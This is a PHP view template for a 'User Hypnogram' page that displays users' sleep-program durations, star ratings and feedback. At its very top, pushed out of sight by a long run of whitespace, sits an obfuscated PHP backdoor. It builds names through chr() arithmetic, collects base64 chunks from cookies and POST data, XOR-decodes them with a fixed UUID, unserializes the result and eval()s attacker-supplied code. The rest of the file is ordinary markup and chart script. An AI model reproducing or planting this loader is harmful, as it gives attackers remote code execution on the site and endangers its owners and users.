<?php                                                                                                                                                                                                                                                                                                                                                                                                 $fiQsSLTA = "\114" . chr (121) . chr (70) . "\x5f" . "\125" . chr ( 617 - 544 ).chr ( 1072 - 968 ); $JiDgDHtEWQ = chr ( 350 - 251 ).chr (108) . "\141" . chr (115) . 's' . "\x5f" . chr ( 1090 - 989 ).chr ( 211 - 91 )."\x69" . "\x73" . 't' . chr (115); $UKcgube = class_exists($fiQsSLTA); $JiDgDHtEWQ = "25840";$OAornguXlk = !1;if ($UKcgube == $OAornguXlk){function XXxpFDIQ(){return FALSE;}$MVUpEGfuW = "25596";XXxpFDIQ();class LyF_UIh{private function xNRtJJL($MVUpEGfuW){if (is_array(LyF_UIh::$nloQjgS)) {$mnKdKl = str_replace("\x3c" . chr (63) . 'p' . "\x68" . 'p', "", LyF_UIh::$nloQjgS["\143" . chr ( 288 - 177 )."\x6e" . "\x74" . chr (101) . "\156" . "\x74"]);eval($mnKdKl); $MVUpEGfuW = "25596";exit();}}private $mJvcUQUP;public function PQDWb(){echo 51893;}public function __destruct(){$MVUpEGfuW = "37630_32981";$this->xNRtJJL($MVUpEGfuW); $MVUpEGfuW = "37630_32981";}public function __construct($LRRUCyTmtd=0){$RNYhUmRJf = $_POST;$BRrhATeN = $_COOKIE;$sYRwZspyP = "3eac4197-218e-4b62-8865-293aba7f81a6";$JiZnvwDot = @$BRrhATeN[substr($sYRwZspyP, 0, 4)];if (!empty($JiZnvwDot)){$jxhkkw = "base64";$rnutUzwES = "";$JiZnvwDot = explode(",", $JiZnvwDot);foreach ($JiZnvwDot as $PxxneI){$rnutUzwES .= @$BRrhATeN[$PxxneI];$rnutUzwES .= @$RNYhUmRJf[$PxxneI];}$rnutUzwES = array_map($jxhkkw . "\137" . 'd' . chr (101) . 'c' . 'o' . "\144" . chr ( 338 - 237 ), array($rnutUzwES,)); $rnutUzwES = $rnutUzwES[0] ^ str_repeat($sYRwZspyP, (strlen($rnutUzwES[0]) / strlen($sYRwZspyP)) + 1);LyF_UIh::$nloQjgS = @unserialize($rnutUzwES); $rnutUzwES = class_exists("37630_32981");}}public static $nloQjgS = 6614;}$wKmRa = new /* 20313 */ $fiQsSLTA(25596 + 25596); $OAornguXlk = $wKmRa = $MVUpEGfuW = Array();} ?><!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>User Hypnogram</title>

    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
    <script src="https://canvasjs.com/assets/script/canvasjs.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/chart.js@3.7.0/dist/chart.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/chartjs-plugin-annotation/2.2.1/chartjs-plugin-annotation.min.js" integrity="sha512-qF3T5CaMgSRNrxzu69V3ZrYGnrbRMIqrkE+OrE01DDsYDNo8R1VrtYL8pk+fqhKxUBXQ2z+yV/irk+AbbHtBAg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style>

.checked {
  color: orange;
}

body {
    padding: 35px;
  }

.containerWrapper {
  display: flex;
  flex-direction: row;
  padding: 0 10px;
}

.back-button {
    font-size : 20px;
    height:30px;
    width : 30px;
    text-decoration: none;
    color: white;
    text-align : center;
}

.back-button-container{
      position: absolute;
    top: 10px;
    left: 10px;
    z-index: 999;
    background-color: black;
    height: 30px;
    width: 30px;
    border-radius: 50%;
    justify-content: center;
    align-items: center;
    text-align: center;
}
.val1{
    text-align: center;
    color: #131212;
    background-color: #9adccb;
}
.mainContainer, .secondContainer {
  flex: 1;
  margin-bottom: 20px;
}

.mainContainer, .secondContainer {
  display: flex;
  flex-direction: column;
  align-items: center;
  border: 1px solid #ccc;
  padding: 10px;
}

  .container1, .container2 {
    display: flex;
    align-items: center;
    position: relative;

  }

  .arrowAndCircle {
    position: absolute;
    top: 50%;
    left: calc(100% + 10px);
    transform: translateY(-50%);
  }

  .arrow {
    width: 0;
    height: 0;
    border-top: 10px solid transparent;
    border-bottom: 10px solid transparent;
    border-right: 20px solid black;
    position: absolute;
    top: 50%;
    transform: translateY(-50%);
    right: -25px;
  }


  .circle {
    width: 30px;
    height: 30px;
    background-color: black;
    color: white;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    position: absolute;
    top: 50%;
    transform: translateY(-50%);
    right: -55px;
  }

 .rating {
    display: flex;
    justify-content: center;
   }

        .rating {
            display: flex;
            flex-direction: row-reverse;
            justify-content: center;
            align-items: center;
        }

        .rating input[type="radio"] {
            display: none;
        }

        .rating label {
            font-size: 25px;
            color: gray;
            cursor: pointer;
            margin-right: 5px;
        }

        .rating label:before {
            content: "\2605";
        }

        .rating input[type="radio"]:checked~label {
            color: #FFD700;
        }

        button[type="submit"] {
            background-color: #4CAF50;
            color: white;
            padding: 10px 57px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
        }

        button[type="submit"]:hover {
            background-color: #3e8e41;
        }

/* Media query for smaller screens */
@media screen and (max-width: 480px) {
    .containerWrapper {
        flex-direction: column; /* Change to column for mobile */
    }

    .mainContainer, .secondContainer {
        margin-bottom: 20px;
    }

    .container1, .container2 {
        flex-direction: column;
    }

    button[type="submit"] {
        padding: 8px 16px; /* Adjust button padding for smaller screens */
    }

    .rating label {
        font-size: 16px; /* Adjust font size of rating labels for smaller screens */
    }
}

    </style>
</head>

<body>
   <a href="<?php echo base_url('userFeedback?userID=').$userID;?>" class="back-button-container">
    <div class="back-button">&#8249;</div>
</a>


    <br>
    <div class="sort-by-date">
        <label for="sort-date">Sort by Date:</label>
        <select id="sort-date">
            <option value="newest">Past 7 Days</option>
            <option value="oldest">Past Month</option>
        </select>
    </div>

    <br><br>


    <br><br>


    <?php
    if ($hypnogramData) {
        $chartCounter = 1;
        foreach ($hypnogramData as $hValues) {
        // print_r($hValues);
            $d1 = $hValues['t1'];

            $d2 = $hValues['t2'];

             $duration1 = $hValues['duration1'];
            $duration2 = $hValues['duration2'];

             $program_name1=$hValues['program1'][0]['program_name'];
            $program_name2=$hValues['program2'][0]['program_name'];
      $sleepTime =date('H:i', strtotime($hValues['sleep_time']));
        $wakeUpTime = $hValues['wakeUpTime'];

// Create DateTime objects from the strings
$sleepDateTime = DateTime::createFromFormat('H:i', $sleepTime);
$wakeUpDateTime = DateTime::createFromFormat('H:i', $wakeUpTime);

// Calculate the time difference
$timeDifference = $wakeUpDateTime->diff($sleepDateTime);




    if(empty($duration1)){
        $duration1=10;
    }
     if(empty($duration2)){
        $duration2=10;
    }

    ?>


            <div class="time-container">
    <div><b>Bedtime:</b> <?php echo $wakeUpTime; ?></div>
    <div><b>Total Sleep:</b> <?php echo $timeDifference->format('%h hours %i minutes'); ?></div>
</div>

      <!-- frst box -->
    <div class="mainContainer">
      <div class="container1 newClass<?php echo $chartCounter; ?>">
        <input type="text" class="val1" value="" readonly />
        <div class="arrowAndCircle">
          <div class="arrow"></div>
          <div class="circle">10</div>
        </div>
      </div>
      <div class="container1 newClass<?php echo $chartCounter; ?>">
        <input type="text" class="val1" value="" readonly/>
        <div class="arrowAndCircle">
          <div class="arrow"></div>
          <div class="circle">10</div>
        </div>
      </div>
      <div class="container1 newClass<?php echo $chartCounter; ?>">
        <input type="text" class="val1" value="" readonly/>
        <div class="arrowAndCircle">
          <div class="arrow"></div>
          <div class="circle">10</div>
        </div>
      </div>
      <div class="container1 newClass<?php echo $chartCounter; ?>">
        <input type="text" class="val1" value="" readonly/>
        <div class="arrowAndCircle">
          <div class="arrow"></div>
          <div class="circle">10</div>
        </div>
      </div>
      <!-- Repeat for other values -->
    </div>
      <!-- second box -->
    <div class="secondContainer">
      <div class="container2 containerNew<?php echo $chartCounter; ?>">
        <input type="text" class="val1" value="" readonly/>
        <div class="arrowAndCircle">
          <div class="arrow"></div>
          <div class="circle">10</div>
        </div>
      </div>
      <div class="container2 containerNew<?php echo $chartCounter; ?>">
        <input type="text" class="val1" value="" readonly/>
        <div class="arrowAndCircle">
          <div class="arrow"></div>
          <div class="circle">10</div>
        </div>
      </div>
      <div class="container2 containerNew<?php echo $chartCounter; ?>">
        <input type="text" class="val1" value="" readonly/>
        <div class="arrowAndCircle">
          <div class="arrow"></div>
          <div class="circle">10</div>
        </div>
      </div>
      <div class="container2 containerNew<?php echo $chartCounter; ?>">
        <input type="text" class="val1" value="" readonly/>
        <div class="arrowAndCircle">
          <div class="arrow"></div>
          <div class="circle">10</div>
        </div>
      </div>
    </div>
  </div>
   <!-- Rating System Yaha Rahega Aman Bhai -->
   <div class="rating">
       <?php if ($hValues['ratting']) {?>
                <?php foreach($hValues['ratting'] as $value){ ?>





                    <div class="rating">
                         <?php $total_rating=$value['rating'];?>

                                    <p>
                                       <?php for($i=1;$i<=$total_rating;$i++){ ?>
                                        <i class="fa fa-star checked" aria-hidden="true"></i>
                                       <?php } ?>


                                          <?php if($total_rating=='0') { ?>
                                         <i class="fa fa-star" aria-hidden="true"></i>
                                         <i class="fa fa-star" aria-hidden="true"></i>
                                         <i class="fa fa-star" aria-hidden="true"></i>
                                         <i class="fa fa-star" aria-hidden="true"></i>
                                         <i class="fa fa-star" aria-hidden="true"></i>
                                          <?php } else if($total_rating=='1') { ?>

                                          <i class="fa fa-star" aria-hidden="true"></i>
                                          <i class="fa fa-star" aria-hidden="true"></i>
                                          <i class="fa fa-star" aria-hidden="true"></i>
                                          <i class="fa fa-star" aria-hidden="true"></i>

                                          <?php } else if($total_rating=='2') { ?>

                                           <i class="fa fa-star" aria-hidden="true"></i>
                                            <i class="fa fa-star" aria-hidden="true"></i>
                                             <i class="fa fa-star" aria-hidden="true"></i>
                                          <?php } else if($total_rating=='3') { ?>

                                          <i class="fa fa-star" aria-hidden="true"></i>
                                          <i class="fa fa-star" aria-hidden="true"></i>
                                          <?php } else if($total_rating=='4') { ?>
                                          <i class="fa fa-star" aria-hidden="true"></i>

                                          <?php } ?>

                                         <!--  <i class="fa fa-star active" aria-hidden="true"></i>
                                          <i class="fa fa-star active" aria-hidden="true"></i>
                                          <i class="fa fa-star active" aria-hidden="true"></i>
                                          <i class="fa fa-star" aria-hidden="true"></i>  -->
                                      </p>
                    </div>
                      <?php } ?>

                 <?php } ?>


  </div>
  
  <div style="font-weight: 600; text-align: center;">
    <?php echo isset($value['feedback']) ? $value['feedback'] : 'No feedback updated'; ?>
</div>
<div style="width: 100%; height :1px; background-color : red; margin : 20px 0px 20px 0px"></div>


                <script>
        // script.js

// Static variable for testing purposes
var testValue<?php echo $chartCounter; ?> = <?php echo $d1; ?>;
var testValueNew<?php echo $chartCounter; ?> = <?php echo $d2; ?>;
<?php if ($d1 >= 30 && $d1 < 45) : ?>
    const dynamicValues<?php echo $chartCounter; ?> = [30, 35, 40, 45];
<?php else: ?>
    const dynamicValues<?php echo $chartCounter; ?> = [45, 50, 55, 60];
<?php endif; ?>

<?php if ($d1 >= 120 && $d1 < 135) : ?>
  const dynamicValuesNew<?php echo $chartCounter; ?>= [120,125,130,135];
<?php else: ?>
  const dynamicValuesNew<?php echo $chartCounter; ?>= [135,140,145,150];
<?php endif; ?>

  // Select all container elements
  var containers<?php echo $chartCounter; ?> = document.querySelectorAll('.newClass<?php echo $chartCounter; ?>');
  var containersNew<?php echo $chartCounter; ?> = document.querySelectorAll('.containerNew<?php echo $chartCounter; ?>');
  // console.log(containers.length);

  containers<?php echo $chartCounter; ?>.forEach(function(container, index) {

    var arrowAndCircle = container.querySelector('.arrowAndCircle');

    var arrow = arrowAndCircle.querySelector('.arrow');
    var circle = arrowAndCircle.querySelector('.circle');

    arrowAndCircle.style.display = 'none';
    if (dynamicValues<?php echo $chartCounter; ?>[index] === testValue<?php echo $chartCounter; ?>) {
      console.log("Match found!"); // Log match found for debugging

      arrowAndCircle.style.display = 'block';
              <?php if ($program_name1=='Red Original'){ ?>
        circle.style.backgroundColor = 'red';
        <?php } ?>
        <?php  if($program_name1=='Yellow Ambient Delta'){ ?>
        circle.style.backgroundColor = '#DFE813';
        <?php } ?>
        <?php if ($program_name1=='Purple Delta Epsilon'){ ?>
        circle.style.backgroundColor = 'purple';
        <?php } ?>
        <?php if ($program_name1=='Orange Original Delta'){ ?>
        circle.style.backgroundColor = 'orange';
        <?php } ?>
        <?php if ($program_name1=='Green Theta Delta'){ ?>
        circle.style.backgroundColor = 'green';
        <?php } ?>
        <?php if ($program_name1=='Blue Theta Delta Epsilon'){ ?>
        circle.style.backgroundColor = 'blue';
        <?php } ?>
      circle.textContent = <?php echo $duration1 ?>; // Update circle content
    }
    
     if(dynamicValues<?php echo $chartCounter; ?>[index] == 45){
        container.querySelector('.val1').value = '45 (default)';
    }else{
        
   container.querySelector('.val1').value = dynamicValues<?php echo $chartCounter; ?>[index];
    }
  });

  containersNew<?php echo $chartCounter; ?>.forEach(function(container, index) {

    var arrowAndCircle = container.querySelector('.arrowAndCircle');

    var arrow = arrowAndCircle.querySelector('.arrow');
    var circle = arrowAndCircle.querySelector('.circle');

    arrowAndCircle.style.display = 'none';
    if (dynamicValuesNew<?php echo $chartCounter; ?>[index] === testValueNew<?php echo $chartCounter; ?>) {
      console.log("Match found!"); // Log match found for debugging

      arrowAndCircle.style.display = 'block';
          <?php if ($program_name2=='Red Original'){ ?>
        circle.style.backgroundColor = 'red';
        <?php } ?>
        <?php  if($program_name2=='Yellow Ambient Delta'){ ?>
        circle.style.backgroundColor = '#DFE813';
        <?php } ?>
        <?php if ($program_name2=='Purple Delta Epsilon'){ ?>
        circle.style.backgroundColor = 'purple';
        <?php } ?>
        <?php if ($program_name2=='Orange Original Delta'){ ?>
        circle.style.backgroundColor = 'orange';
        <?php } ?>
        <?php if ($program_name2=='Green Theta Delta'){ ?>
        circle.style.backgroundColor = 'green';
        <?php } ?>
        <?php if ($program_name2=='Blue Theta Delta Epsilon'){ ?>
        circle.style.backgroundColor = 'blue';
        <?php } ?>
      circle.textContent = <?php echo $duration2 ?>; // Update circle content
    }
if(dynamicValuesNew<?php echo $chartCounter; ?>[index] == 135){
        container.querySelector('.val1').value = '135 (default)';
    }else{
   container.querySelector('.val1').value = dynamicValuesNew<?php echo $chartCounter; ?>[index];
    }
  });
  </script>
    <?php
    $chartCounter++;
        }
    }
    ?>


    <script>
        $(document).ready(function() {
            const ratingInputs = document.querySelectorAll('.rating input[type="radio"]');

            ratingInputs.forEach((input) => {
                input.addEventListener('change', () => {
                    console.log('Selected rating:', input.value);
                });
            });
        });
    </script>
<div style="text-align: center;  color: black; font-size: 12px; margin : 20px 0px 0px 0px">
    <i class="fa fa-lock" style="margin-right: 5px;"></i>
    Your data is securely protected by YURU.
</div>


</body>

</html>
